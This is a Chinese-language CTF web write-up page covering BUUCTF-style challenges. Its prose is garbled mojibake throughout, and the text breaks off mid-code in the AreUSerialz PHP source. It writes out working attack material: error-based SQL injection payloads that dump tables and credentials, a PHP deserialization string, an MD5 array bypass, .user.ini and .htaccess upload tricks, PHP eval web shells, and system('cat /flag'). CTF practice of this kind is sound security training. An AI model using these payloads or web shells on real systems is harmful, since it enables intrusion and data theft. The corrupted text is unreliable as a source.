<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br></code></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>ç”¨filteré“¾æ¼æ´æ¥ç»•è¿‡ï¼Œè¢«ç¦ç”¨çš„flag<br>è¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªå·¥å…·php_filter_chain_generator<br><img src="/images/69D87BB8915344faA1258C05CC9D5DAC.png" srcset="/img/loading.gif" lazyload><br>åŒæ ·æŸ¥çœ‹æºç å°±èƒ½çœ‹åˆ°flagäº†</p>
<p><img src="/images/B806122033314b9aB01D9B80BEE33AAF.png" srcset="/img/loading.gif" lazyload><br>æŸ¥çœ‹æºç å³å¯çœ‹åˆ°flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL 1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL 1</h2><p>sqlæ³¨å…¥é¢˜ï¼Œå…ˆè¯•è¯•ä¸‡èƒ½å¯†ç username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123<br><img src="/images/4RO.png" srcset="/img/loading.gif" lazyload><br>ç»è¿‡ä¸€ç³»åˆ—å°è¯•åï¼Œå‘ç°ç©ºæ ¼ï¼Œ&#x3D;ï¼Œunionéƒ½è¢«è¿‡æ»¤äº†<br>ç©ºæ ¼è¢«è¿‡æ»¤æˆ‘ä»¬ä½¿ç”¨()æ¥ä»£æ›¿ç©ºæ ¼&#x2F;**&#x2F;è²Œä¼¼ä¹Ÿè¢«è¿‡æ»¤äº†<br>æ—¢ç„¶å¦‚æ­¤ï¼Œå°è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥<br><strong>çˆ†åº“</strong><br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/YKR.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>çˆ†è¡¨</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/VNTXAGU.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>çˆ†å­—æ®µ</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/16B3IU.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>çˆ†å€¼</strong><br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br><img src="/images/M3HJZ8NQ67JFV.png" srcset="/img/loading.gif" lazyload><br>å¹¶æ²¡æœ‰æˆåŠŸæ˜¾ç¤ºflagï¼Œåªæ˜¾ç¤ºäº†ä¸€åŠ~<br>ç»è¿‡æŸ¥è¯¢çŸ¥é“äº†right()å¯ä»¥æŸ¥è¯¢åé¢çš„éƒ¨åˆ†<br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>å’Œå‰é¢æ˜¾ç¤ºå‡ºçš„flagæ‹¼æ¥åˆ æ”¹å¾—åˆ°å®Œæ•´çš„flag</p>
<h2 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h2><p>ç›´æ¥ç»™å‡ºæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br>Please input first<br><br></code></pre></td></tr></table></figure>


<p>å‘ç°ç¬¬äº”ä¸ªifå¯ä»¥è·å¾—flag<br>å…ˆç¬¬ä¸€ä¸ªif<br><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;]))</code><br>issetæ£€æŸ¥æ˜¯å¦æœ‰æ•ˆï¼Œéšä¾¿è¾“ä¸€ä¸ªå­—ç¬¦å°±èƒ½é€šè¿‡<br>ç¬¬äºŒä¸ªif<br><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code><br>ç»•è¿‡è¿™ä¸ªifè¦å…ˆæƒ³åˆ°MD5æ¼æ´ï¼Œæˆ‘å…ˆæƒ³åˆ°çš„æ˜¯0eå¼€å¤´çš„æ¼æ´<br>ps:md5 å€¼æ˜¯ 0e å¼€å¤´ï¼Œåœ¨ php å¼±ç±»å‹æ¯”è¾ƒä¸­åˆ¤æ–­ä¸ºç›¸ç­‰<br>å†çœ‹å›æ¥ï¼Œå¼±æ¯”è¾ƒæ˜¯&#x3D;&#x3D;ï¼Œè€Œæœ¬é¢˜ä¸­æ˜¯&#x3D;&#x3D;&#x3D;å¼ºæ¯”è¾ƒï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è¿™ä¸ªç»•è¿‡<br>åœ¨æŸ¥é˜…åå‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•â€”â€”æ•°ç»„ç»•è¿‡<code>a[]=a&amp;b[]=b</code><br>è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†åˆ¤æ–­ä¸ºçœŸï¼Œåˆ¤æ–­ä¸ºnull&#x3D;&#x3D;&#x3D;null<br>è€Œä¸”id!&#x3D;gg<br>payload:<code>?gg[]=gg&amp;id[]=id</code><br><img src="/images/XNP4L0FHEL.png" srcset="/img/loading.gif" lazyload><br>You got the first steponly one way to get the flag</p>
<p>å¾—åˆ°äº†æˆ‘ä»¬éœ€è¦çš„ç»“æœyou got the first step<br>ä½†å¤šå‡ºæ¥ä¸€å¥ only one way to get the flag<br>æŸ¥çœ‹æºä»£ç å‘ç°æ˜¯è¿™ä¸€å¥æ˜¯ç¬¬ä¸‰ä¸ªifçš„elseè¯­å¥ï¼Œè¯´æ˜ç¬¬ä¸‰ä¸ªifå¹¶æœªç»•è¿‡ï¼Œ<br><code>if(isset($_POST[&#39;passwd&#39;]))</code><br>åŒæ ·éšä¾¿postä¸€ä¸ªå­—ç¬¦å°±èƒ½ç»•è¿‡</p>
<p>å†çœ‹ç¬¬å››ä¸ªif<br><code>if (!is_numeric($passwd))</code><br>is_numeric()å‡½æ•°æ˜¯æ£€æµ‹æ˜¯å¦ä¸ºæ•°å­—å­—ç¬¦ï¼Œæ˜¯åˆ™ture<br>è¿™é‡Œä¸º!is_numeric()ï¼Œå°±æ˜¯ä¸èƒ½å…¨ä¸ºæ•°å­—å­—ç¬¦<br>åŒæ—¶æˆ‘ä»¬çœ‹å‘ç¬¬äº”ä¸ªif<br><code>if($passwd==1234567)</code><br>ä¸ç¬¬å››ä¸ªifç›¸åï¼Œè¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªifæ¡ä»¶æ‰èƒ½è·å¾—flag<br>å…ˆè¯•ç€æŠŠ1234567è½¬åŒ–ä¸º16è¿›åˆ¶<br>passwd&#x3D;12D687<br>æäº¤ååªç»•è¿‡äº†ç¬¬å››ä¸ªifï¼Œä¸è¡Œ<br>ç™¾åº¦ä¸€ä¸‹å‘ç°<br><img src="/images/20210407185102246.png" srcset="/img/loading.gif" lazyload><br>passwd:1234567%00<br>passwd:1234567%20<br>æˆåŠŸå¾—åˆ°flag<br><img src="/images/CJBVJ1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>è¿›å…¥é¡µé¢ï¼Œå…ˆæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æºä»£ç é‡Œæœ‰æ³¨é‡Šyou are not admin<br>flagåº”è¯¥åœ¨adminä¸­ï¼Œçœ‹åˆ°å³è¾¹æœ‰registerå’Œloginï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªçœ‹çœ‹ä»€ä¹ˆæ•ˆæœ<br>ç™»å½•è¿›å»å‘ç°å¤šäº†å‡ ä¸ªé€‰é¡¹<br><img src="/images/GK.png" srcset="/img/loading.gif" lazyload></p>
<p>æŒ¨ä¸ªæŸ¥çœ‹æºä»£ç <br><img src="/images/9DRO.png" srcset="/img/loading.gif" lazyload><br>å‘ç°åœ¨change passwordä¸­çš„æºä»£ç ä¸å…¶ä»–ä¸åŒï¼Œæ˜¾ç¤ºäº†ä¸€ä¸ªgithubç½‘å€ï¼Œè¿›å…¥æŸ¥çœ‹ç½‘é¡µç«Ÿç„¶ä¸å­˜åœ¨ï¼Œé‚£å°±æ¢ä¸€ç§æ–¹æ³•ï¼Œregisteræ³¨å†Œä¸€ä¸ªadminï¼Œæ˜¾ç¤ºå·²è¢«æ³¨å†Œï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•è¯•ç›´æ¥login adminï¼Œå¯†ç éšæ„ï¼Œç«Ÿç„¶æˆåŠŸäº†<br><img src="/images/9WKWG.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ˜¾ç¤ºflagï¼Œåç»­ä¼šè·Ÿè¿›å…¶ä»–æ–¹æ³•</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª.user.ini å†…å®¹ä¸ºauto_prepend_file&#x3D;12.txt<br>ä¸Šä¼ å¤±è´¥ï¼Œæ˜¾ç¤ºexif_imagetype:not image!ï¼Œæ²¡æœ‰å›¾åƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶å¹»æœ¯å¤´ç»•è¿‡<br><img src="/images/1UZPE.png" srcset="/img/loading.gif" lazyload><br>å†æ¬¡ä¸Šä¼ ï¼ŒæˆåŠŸ<br><img src="/images/VT8D.png" srcset="/img/loading.gif" lazyload><br>å†ä¸Šä¼ ä¸€ä¸ªå¸¸ç”¨çš„æœ¨é©¬æ–‡ä»¶<br>ä¸Šä¼ é”™è¯¯ï¼Œæ˜¾ç¤º&lt;? in contents!<br>å±è”½äº†ä¸€äº›ç¬¦å·å¯¼è‡´æ— æ³•ä¸Šä¼ <br>æ¢ç§æ–¹æ³•ä¸Šä¼ <br><img src="/images/8BNM.png" srcset="/img/loading.gif" lazyload><br>è¿™æ¬¡æˆåŠŸä¸Šä¼ <br><img src="/images/G3.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥ç»™å‡ºçš„åœ°å€<br>å…ˆè¾“å…¥a&#x3D;phpinfo()è¯•è¯•èƒ½ä¸èƒ½è¿è¡Œå‘½ä»¤<br><img src="/images/P45UMTRF.png" srcset="/img/loading.gif" lazyload><br>æœ‰å›æ˜¾ï¼ŒæˆåŠŸæ‰§è¡Œ<br>ç»§ç»­post a&#x3D;system(â€œcat &#x2F;flagâ€)<br><img src="/images/U5SYBY1GKWV.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ˜¾ç¤ºflag</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>ä¸Šä¼ .htaccess(ä»¥jpgå½¢å¼æŠ“åŒ…ä¿®æ”¹åç¼€å)<br><img src="/images/8HOSK.png" srcset="/img/loading.gif" lazyload><br>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å¤±è´¥ï¼Œè¿‡æ»¤äº†&lt;?<br>æ¢ä¸€ç§æ–¹å¼</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ä»¥æ‰¾åˆ°flag</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>é¦–å…ˆåœ¨é¶æœºé¡µé¢é‡Œä»–ç»™äº†ä¸ªgithubç½‘å€ï¼Œè¿›å…¥åœ¨web&#x2F;babysqli&#x2F;html&#x2F;search.phpé‡Œæ‰¾åˆ°é‡è¦æºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>	die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br>		<span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>				echo <span class="hljs-variable">$flag</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¾“å…¥ä¸‡èƒ½é’¥åŒ™1â€™ or 1&#x3D;1#æ˜¾ç¤ºdo not hack me ä¸ä¸Šé¢å¯¹åº”ï¼Œé™åˆ¶äº†or</p>
<p>æŠ“åŒ…<br><img src="/images/L64.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œæ˜¾ç¤ºwrong user!<br>æŒ¨ä¸ªè¯•è¯•1ï¼Œ2ï¼Œ3çš„ä½ç½®ï¼ŒæŠŠå®ƒä»¬æ”¹ä¸ºâ€™adminâ€™ï¼Œåœ¨2ä½ç½®æ—¶å›æ˜¾å‘ç”Ÿäº†æ”¹å˜<br><img src="/images/N7R0.png" srcset="/img/loading.gif" lazyload><br>wrong pass!<br>è·³è¿‡äº†userï¼Œé‚£ä¹ˆ3çš„ä½ç½®å°±æ˜¯passwordäº†<br>æ³¨æ„åˆ°ä¸Šé¢çš„ä»£ç ifä¸­æœ‰MD5ï¼Œä½¿ifæˆç«‹<br>è®¾å¯†ç ä¸ºabcï¼ŒMD5åŠ å¯†åä¸ºï¼š900150983cd24fb0d6963f7d28e17f72<br><img src="/images/Y276WNW.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>è¾“å…¥  <code>1&#39;;show tables;#</code><br><img src="/images/LG.png" srcset="/img/loading.gif" lazyload><br>æ ¹æ®å­—é¢æ„æ€ï¼Œflagåº”è¯¥åœ¨FlagHereé‡Œ<br>è¾“å…¥  <code>1&#39;;cat FlagHere</code><br>æ²¡æœ‰æ˜¾ç¤º</p>
<p>è”åˆæ³¨å…¥<br>è¾“å…¥  <code>1&#39;;select from FlagHere;#</code><br><img src="/images/IR6X2.png" srcset="/img/loading.gif" lazyload><br>æ˜¾ç¤ºäº†è¢«è¿‡æ»¤æ‰çš„å†…å®¹</p>
<p>å°è¯•åŒå†™ç»•è¿‡<br><code>1&#39;;sselectelect from FlagHere</code><br>ä¸é€šè¿‡</p>
<p>å°è¯•å¤§å°å†™ç»•è¿‡<br><code>1&#39;;sElECt from FlagHere;#</code><br>åŒæ ·ä¸é€šè¿‡</p>
<h4 id="handlerè¯­æ³•"><a href="#handlerè¯­æ³•" class="headerlink" title="handlerè¯­æ³•"></a>handlerè¯­æ³•</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">handler</span>è¯­å¥ï¼Œä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚<br><span class="hljs-keyword">handler</span>è¯­å¥å¹¶ä¸å…·å¤‡<span class="hljs-keyword">select</span>è¯­å¥ä¸­çš„æ‰€æœ‰åŠŸèƒ½ã€‚<br>mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°<span class="hljs-keyword">sql</span>æ ‡å‡†ä¸­ã€‚<br><span class="hljs-keyword">handler</span>è¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨<br></code></pre></td></tr></table></figure>

<ol>
<li>HANDLER tbl_name OPEN<br>æ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</li>
<li>HANDLER tbl_name READ FIRST<br>è·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œï¼Œuiåä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</li>
<li>HANDLER tbl_name CLOSE<br>å…³é—­æ‰“å¼€çš„å¥æŸ„</li>
<li>HANDLER tbl_name READ index_name&#x3D;value<br>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</li>
</ol>
<p>è¾“å…¥</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/Q560M.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸ</p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span 